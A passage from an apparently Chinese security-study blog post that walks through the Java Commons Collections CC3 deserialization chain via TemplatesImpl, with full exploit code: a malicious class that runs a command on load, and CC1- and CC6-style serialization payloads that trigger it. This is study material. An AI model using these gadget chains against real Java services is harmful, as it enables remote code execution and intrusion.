defineClass(null, b, 0, b.length);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里需要传入一个字节数组，字节数组中应当存放我们自定义类的字节码。接下来看看哪里调用了这个方法，defineTransletClasses 方法中调用了这个方法。</p><p>defineTransletClasses 是外部类 TemplatesImpl 的成员方法，它调用了 TransletClassLoader 内部类的 defineClass 方法：</p><img src="/images/image-20240517084830066.png"><p>由于 defineTransletClasses 是私有方法，再找找谁调用了这个方法。</p><p>getTransletInstance 方法调用了 defineTransletClasses 方法：</p><img src="/images/image-20240517085104839.png"><p>由于 getTransletInstance 是私有方法，再找找谁调用了这个方法。</p><p>newTransformer 方法调用了 getTransletInstance ：</p><img src="/images/image-20240517085438851.png"><h6 id="判断绕过"><a href="#判断绕过" class="headerlink" title="判断绕过"></a>判断绕过</h6><p>刚才在看代码的时候看到一些判断条件，现在来过一下判断。</p><p>getTransletInstance 方法中，如果 _name 为空那么将会直接返回 null，所以 _name 应该不为空，以及需要 _class 为空才能调用 defineTransletClasses 方法：</p><img src="/images/image-20240517091101680.png"><p>defineTransletClasses 方法中如果 _bytecodes 为空会直接抛出异常，所以这里 _bytecodes 应该不为空，以及下面会调用 _tfactory 方法，所以 _tfactory 不为空：</p><img src="/images/image-20240517091708581.png"><p>总结一下：</p><ul><li><strong>_name 不为空</strong></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">private String _name = null;</span><br></pre></td></tr></table></figure><ul><li><strong>_class 为空</strong></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">private Class[] _class = null;</span><br></pre></td></tr></table></figure><ul><li><strong>_bytecodes 需要被赋值为字节码文件</strong></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">private byte[][] _bytecodes = null;</span><br></pre></td></tr></table></figure><p>它后面会作为 defineClass 方法的参数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_class[i] = loader.defineClass(_bytecodes[i]);</span><br></pre></td></tr></table></figure><p>由于 _bytecodes 是一个二维数组，而传入的参数是 _bytecodes[i] ，也就是一个一维数组，所以我们需要创建一个一维数组，再把它放到 _bytecodes 二维数组中去。这里因为前面的循环次数取的是 _bytecodes 的长度，如果只传入一个一维数组，那么长度为 1 ，只循环一次，i 只能取到 0 这个值，那么 _bytecodes[i] 就是传入的一维数组：</p><img src="/images/image-20240517103843968.png"><ul><li><strong>_tfactory 需要被赋值为 TransformerFactoryImpl 对象</strong></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">private transient TransformerFactoryImpl _tfactory = null;</span><br></pre></td></tr></table></figure><p>由于 _tfactory 被 transient 修饰，无法被序列化，因此没办法手动赋值。但是在 TemplatesImpl 类的 readObject 方法中有赋值语句：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_tfactory = new TransformerFactoryImpl();</span><br></pre></td></tr></table></figure><p>所以 _tfactory 可以不用管。</p><p>除此之外，我们还需要关注一件事：</p><img src="/images/image-20240524155627516.png"><p>TemplatesImpl#defineTransletClasses() 会判断我们传入的类的父类是否为 ABSTRACT_TRANSLET ，如果是的话才会将 _transletIndex 赋值成 i （此时 i 为 0），而 _transletIndex 的默认值是 -1 ，如果这里不被赋值的话，下面经过判断后就会直接抛出异常。所以我们还要让传入的类继承 ABSTRACT_TRANSLET 。</p><p>我们可以在 TemplatesImpl 类中查到 ABSTRACT_TRANSLET 属性的定义：</p><img src="/images/image-20240524160402778.png"><p>可以看到它指代的类是 AbstractTranslet ，那么我们只需让传入的类继承 AbstractTranslet 类就行。</p><h6 id="写个小程序验证一下"><a href="#写个小程序验证一下" class="headerlink" title="写个小程序验证一下"></a>写个小程序验证一下</h6><p>恶意类 Eval ：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">import com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line">import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line">import com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.Serializable;</span><br><span class="line"></span><br><span class="line">public class Eval extends AbstractTranslet &#123;</span><br><span class="line">    // 恶意代码放在静态代码块中</span><br><span class="line">    static &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Runtime.getRuntime().exec(&quot;calc&quot;);</span><br><span class="line">        &#125; catch (IOException e) &#123;</span><br><span class="line">            throw new RuntimeException(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 需要重写父类的两个方法</span><br><span class="line">    @Override</span><br><span class="line">    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行程序 test1 ：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"></span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.nio.file.Files;</span><br><span class="line">import java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line">public class test1 &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        // 初始化TemplatesImpl对象</span><br><span class="line">        TemplatesImpl templates = new TemplatesImpl();</span><br><span class="line">        // _name不为空</span><br><span class="line">        setFieldValue(templates, &quot;_name&quot;, &quot;test&quot;);</span><br><span class="line"></span><br><span class="line">        // 这里需要用到恶意类的字节码文件，通过maven编译后target目录下有字节码文件</span><br><span class="line">        byte[] code = Files.readAllBytes(Paths.get(&quot;C:\\Users\\miaoj\\Documents\\Java安全代码实验\\CC3链\\CC3\\target\\classes\\com\\miaoji\\Eval.class&quot;));</span><br><span class="line">        byte[][] codes = &#123;code&#125;;</span><br><span class="line">        // _bytecodes和_tfactory不为空，由于还没有进行反序列化，这里先手动设置_tfactory的值</span><br><span class="line">        setFieldValue(templates, &quot;_bytecodes&quot;, codes);</span><br><span class="line">        setFieldValue(templates, &quot;_tfactory&quot;, new TransformerFactoryImpl());</span><br><span class="line"></span><br><span class="line">        templates.newTransformer();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 反射设置值的操作重复，可以抽离成一个方法</span><br><span class="line">    public static void setFieldValue(Object object, String field_name, Object filed_value) throws Exception &#123;</span><br><span class="line">        Class clazz = object.getClass();</span><br><span class="line">        Field declaredField = clazz.getDeclaredField(field_name);</span><br><span class="line">        declaredField.setAccessible(true);</span><br><span class="line">        declaredField.set(object, filed_value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>成功弹出计算器。</p><h4 id="利用链之-TrAXFilter-类"><a href="#利用链之-TrAXFilter-类" class="headerlink" title="利用链之 TrAXFilter 类"></a>利用链之 TrAXFilter 类</h4><p>TrAXFilter 的构造方法会调用 TemplatesImpl 的 newTransformer() 方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">public TrAXFilter(Templates templates)  throws</span><br><span class="line">    TransformerConfigurationException</span><br><span class="line">&#123;</span><br><span class="line">    _templates = templates;</span><br><span class="line">    _transformer = (TransformerImpl) templates.newTransformer();</span><br><span class="line">    _transformerHandler = new TransformerHandlerImpl(_transformer);</span><br><span class="line">    _useServicesMechanism = _transformer.useServicesMechnism();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而且还是个 public 方法，可惜的是 TrAXFilter 不能被序列化。</p><h4 id="入口类-InstantiateTransformer"><a href="#入口类-InstantiateTransformer" class="headerlink" title="入口类 InstantiateTransformer"></a>入口类 InstantiateTransformer</h4><p>InstantiateTransformer 的 transform 能够实例化对象：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">public Object transform(Object input) &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">        if (input instanceof Class == false) &#123;</span><br><span class="line">            throw new FunctorException(</span><br><span class="line">                &quot;InstantiateTransformer: Input object was not an instanceof Class, it was a &quot;</span><br><span class="line">                    + (input == null ? &quot;null object&quot; : input.getClass().getName()));</span><br><span class="line">        &#125;</span><br><span class="line">        Constructor con = ((Class) input).getConstructor(iParamTypes);</span><br><span class="line">        return con.newInstance(iArgs);</span><br><span class="line"></span><br><span class="line">    &#125; catch (NoSuchMethodException ex) &#123;</span><br><span class="line">        throw new FunctorException(&quot;InstantiateTransformer: The constructor must exist and be public &quot;);</span><br><span class="line">    &#125; catch (InstantiationException ex) &#123;</span><br><span class="line">        throw new FunctorException(&quot;InstantiateTransformer: InstantiationException&quot;, ex);</span><br><span class="line">    &#125; catch (IllegalAccessException ex) &#123;</span><br><span class="line">        throw new FunctorException(&quot;InstantiateTransformer: Constructor must be public&quot;, ex);</span><br><span class="line">    &#125; catch (InvocationTargetException ex) &#123;</span><br><span class="line">        throw new FunctorException(&quot;InstantiateTransformer: Constructor threw an exception&quot;, ex);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>于是我们可以直接用 InstantiateTransformer 来实例化 TrAXFilter 对象。</p><h6 id="写个小程序验证一下-1"><a href="#写个小程序验证一下-1" class="headerlink" title="写个小程序验证一下"></a>写个小程序验证一下</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line">import org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"></span><br><span class="line">import javax.xml.transform.Templates;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.nio.file.Files;</span><br><span class="line">import java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line">public class test2 &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        // 初始化TemplatesImpl对象</span><br><span class="line">        TemplatesImpl templates = new TemplatesImpl();</span><br><span class="line">        // _name不为空</span><br><span class="line">        setFieldValue(templates, &quot;_name&quot;, &quot;test&quot;);</span><br><span class="line">        // 这里需要用到恶意类的字节码文件，通过maven编译后target目录下有字节码文件</span><br><span class="line">        byte[] code = Files.readAllBytes(Paths.get(&quot;C:\\Users\\miaoj\\Documents\\Java安全代码实验\\CC3链\\CC3\\target\\classes\\com\\miaoji\\Eval.class&quot;));</span><br><span class="line">        byte[][] codes = &#123;code&#125;;</span><br><span class="line">        // _bytecodes和_tfactory不为空，由于还没有进行反序列化，这里先手动设置_tfactory的值</span><br><span class="line">        setFieldValue(templates, &quot;_bytecodes&quot;, codes);</span><br><span class="line">        setFieldValue(templates, &quot;_tfactory&quot;, new TransformerFactoryImpl());</span><br><span class="line"></span><br><span class="line">        // 初始化InstantiateTransformer对象，利用它实例化TrAXFilter对象</span><br><span class="line">        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]&#123;Templates.class&#125;, new Object[]&#123;templates&#125;);</span><br><span class="line">        instantiateTransformer.transform(TrAXFilter.class);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 反射设置值的操作重复，可以抽离成一个方法</span><br><span class="line">    public static void setFieldValue(Object object, String field_name, Object filed_value) throws Exception &#123;</span><br><span class="line">        Class clazz = object.getClass();</span><br><span class="line">        Field declaredField = clazz.getDeclaredField(field_name);</span><br><span class="line">        declaredField.setAccessible(true);</span><br><span class="line">        declaredField.set(object, filed_value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="反序列化利用"><a href="#反序列化利用" class="headerlink" title="反序列化利用"></a>反序列化利用</h4><p>我们依然是选择用 InvokerTransformer 类的 transform 方法来执行 TemplatesImpl 的 newTransformer() 方法。但是反序列化的入口有多个选择，可以使用 AnnotationInvocationHandler 的 readObject ，或者 HashMap 的 readObject 。</p><p>除了上述方法之外还可以用 TrAXFilter 类来调用 TemplatesImpl 的 newTransformer() 方法。</p><h6 id="将-AnnotationInvocationHandler-作为入口类"><a href="#将-AnnotationInvocationHandler-作为入口类" class="headerlink" title="将 AnnotationInvocationHandler 作为入口类"></a>将 AnnotationInvocationHandler 作为入口类</h6><p>前面学 CC1 链的时候我们就是用 AnnotationInvocationHandler 的 readObject 方法来反序列化的，但是有 Java 版本限制。</p><p>payload 如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line">import java.io.*;</span><br><span class="line">import java.lang.reflect.*;</span><br><span class="line">import java.nio.file.Files;</span><br><span class="line">import java.nio.file.Paths;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class CC1_TemplatesImpl &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        // 初始化 TemplatesImpl 对象</span><br><span class="line">        TemplatesImpl templates = new TemplatesImpl();</span><br><span class="line">        // _name 不为空</span><br><span class="line">        setFieldValue(templates,&quot;_name&quot;,&quot;test&quot;);</span><br><span class="line">        // 这里需要用到恶意类的字节码文件，通过 maven 编译后 target 目录下有字节码文件</span><br><span class="line">        byte[] code = Files.readAllBytes(Paths.get(&quot;C:\\Users\\miaoj\\Documents\\Java安全代码实验\\CC3链\\CC3\\target\\classes\\com\\miaoji\\Eval.class&quot;));</span><br><span class="line">        byte[][] codes = &#123;code&#125;;</span><br><span class="line">        // _bytecodes 不为空</span><br><span class="line">        setFieldValue(templates,&quot;_bytecodes&quot;,codes);</span><br><span class="line"></span><br><span class="line">        //利用 ChainedTransformer 执行 templates.newTransformer();</span><br><span class="line">        Transformer[] transformers = new Transformer[]&#123;</span><br><span class="line">                new ConstantTransformer(templates),</span><br><span class="line">                new InvokerTransformer(&quot;newTransformer&quot;, null,null)</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span><br><span class="line">        // 新建一个 HashMap ，没什么意义，仅作为参数传入</span><br><span class="line">        HashMap&lt;Object,Object&gt; map = new HashMap&lt;&gt;();</span><br><span class="line">        // 初始化利用链 LazyMap，LazyMap 的 get 方法将会调用 chainedTransformer 的 transform 方法</span><br><span class="line">        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        // 反射获取 AnnotationInvocationHandler 的构造方法</span><br><span class="line">        Class&lt;?&gt; c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">        Constructor&lt;?&gt; annotationInvocationhdlConstructor = c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        annotationInvocationhdlConstructor.setAccessible(true);</span><br><span class="line">        // 利用构造方法将 AnnotationInvocationHandler 对象的 memberValues 属性赋值为 LazyMap 对象</span><br><span class="line">        // memberValues 属性的 get 方法将会被 AnnotationInvocationHandler 的 invoke 方法调用</span><br><span class="line">        InvocationHandler h = (InvocationHandler) annotationInvocationhdlConstructor.newInstance(Override.class, lazyMap);</span><br><span class="line"></span><br><span class="line">        // 为了能够调用 h 的 invoke 方法，我们用 h 来构造一个代理对象，这样当代理对象的任意方法被调用时，h 的 invoke 方法都会被调用</span><br><span class="line">        Map mapProxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),new Class[]&#123;Map.class&#125;,h);</span><br><span class="line"></span><br><span class="line">        // 再次利用构造方法将另一个 AnnotationInvocationHandler 对象的 memberValues 属性赋值为代理对象</span><br><span class="line">        // AnnotationInvocationHandler 的 readObject 方法中会调用 memberValues.entrySet() 方法，届时代理对象的 invoke 方法将被触发</span><br><span class="line">        Object o = annotationInvocationhdlConstructor.newInstance(Override.class, mapProxy);</span><br><span class="line">        serialize(o);</span><br><span class="line">        unserialize(&quot;cc1_templatesImpl.bin&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void setFieldValue(Object object,String field_name,Object filed_value) throws Exception &#123;</span><br><span class="line">        Class clazz=object.getClass();</span><br><span class="line">        Field declaredField=clazz.getDeclaredField(field_name);</span><br><span class="line">        declaredField.setAccessible(true);</span><br><span class="line">        declaredField.set(object,filed_value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void serialize(Object o) throws Exception &#123;</span><br><span class="line">        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;cc1_templatesImpl.bin&quot;));</span><br><span class="line">        oos.writeObject(o);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void unserialize(String filename) throws Exception &#123;</span><br><span class="line">        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="将-HashMap-作为入口类"><a href="#将-HashMap-作为入口类" class="headerlink" title="将 HashMap 作为入口类"></a>将 HashMap 作为入口类</h6><p>前面学 CC6 链时，我们便是将 HashMap 作为入口类，原因是 HashMap 的 readObject 方法会调用 key 的 hashCode 方法。</p><p>之后的利用链 TiedMapEntry ：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TiedMapEntry#hashCode() -&gt; TiedMapEntry#getValue() -&gt; TiedMapEntry.map#get() </span><br></pre></td></tr></table></figure><p>所以将 TiedMapEntry 的 map 属性赋值为 LazyMap 对象就好。</p><p>payload 如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line">import org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line">import java.io.*;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.nio.file.Files;</span><br><span class="line">import java.nio.file.Paths;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class CC6_TemplatesImpl &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        // 初始化 TemplatesImpl 对象</span><br><span class="line">        TemplatesImpl templates = new TemplatesImpl();</span><br><span class="line">        // _name 不为空</span><br><span class="line">        setFieldValue(templates,&quot;_name&quot;,&quot;test&quot;);</span><br><span class="line">        // 这里需要用到恶意类的字节码文件，通过 maven 编译后 target 目录下有字节码文件</span><br><span class="line">        byte[] code = Files.readAllBytes(Paths.get(&quot;C:\\Users\\miaoj\\Documents\\Java安全代码实验\\CC3链\\CC3\\target\\classes\\com\\miaoji\\Eval.class&quot;));</span><br><span class="line">        byte[][] codes = &#123;code&#125;;</span><br><span class="line">        // _bytecodes 不为空</span><br><span class="line">        setFieldValue(templates,&quot;_bytecodes&quot;,codes);</span><br><span class="line"></span><br><span class="line">        //利用 ChainedTransformer 执行 templates.newTransformer();</span><br><span class="line">        Transformer[] transformers = new Transformer[]&#123;</span><br><span class="line">                new ConstantTransformer(templates),</span><br><span class="line">                new InvokerTransformer(&quot;newTransformer&quot;, null,null)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        // 新建一个 HashMap ，没什么意义，仅作为参数传入</span><br><span class="line">        HashMap&lt;Object,Object&gt; map = new HashMap&lt;&gt;();</span><br><span class="line">        // 初始化利用链 LazyMap，LazyMap 的 get 方法将会调用 chainedTransformer 的 transform 方法</span><br><span class="line">        // 为了防止序列化时命令执行，这里先传入一个普通的 ConstantTransformer 对象</span><br><span class="line">        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map,new ConstantTransformer(1));</span><br><span class="line"></span><br><span class="line">        // 将 TiedMapEntry 的 map 属性赋值为 LazyMap 对象</span><br><span class="line">        // 利用链：TiedMapEntry#hashCode() -&gt; TiedMapEntry#getValue() -&gt; TiedMapEntry.map#get()</span><br><span class="line">        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,&quot;key&quot;);</span><br><span class="line"></span><br><span class="line">        // 新建一个 HashMap 对象，将 TiedMapEntry 对象作为 key 传入，之后将会调用 TiedMapEntry#hashCode()</span><br><span class="line">        HashMap&lt;Object,Object&gt; map2 = new HashMap&lt;&gt;();</span><br><span class="line">        // 序列化时这里将会提前调用 TiedMapEntry#hashCode() ，导致 lazyMap::get()被调用，导致 lazyMap 的 key 属性被赋值</span><br><span class="line">        // 于是反序列化调用 lazyMap::get() 时无法进入判断，无法调用 transform 方法</span><br><span class="line">        map2.put(tiedMapEntry,&quot;test&quot;);</span><br><span class="line">        // 为了解决上述问题，HashMap 对象的 put 方法执行后需要去除 lazyMap 中的 key</span><br><span class="line">        lazyMap.remove(&quot;key&quot;);</span><br><span class="line"></span><br><span class="line">        // 最后利用反射将 LazyMap 的 factory 对象修改为 chainedTransformer</span><br><span class="line">        Class c = LazyMap.class;</span><br><span class="line">        Field factory = c.getDeclaredField(&quot;factory&quot;);</span><br><span class="line">        factory.setAccessible(true);</span><br><span class="line">        factory.set(lazyMap,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        serialize(map2);</span><br><span class="line">        unserialize(&quot;cc6_templatesImpl.bin&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    public static void setFieldValue(Object object,String field_name,Object filed_value) throws Exception &#123;</span><br><span class="line">        Class clazz=object.getClass();</span><br><span class="line">        Field declaredField=clazz.getDeclaredField(field_name);</span><br><span class="line">        declaredField.setAccessible(true);</span><br><span class="line">        declaredField.set(object,filed_value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void serialize(Object obj) throws Exception &#123;</span><br><span class="line">        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;cc6_templatesImpl.bin&quot;));</span><br><span class="line">        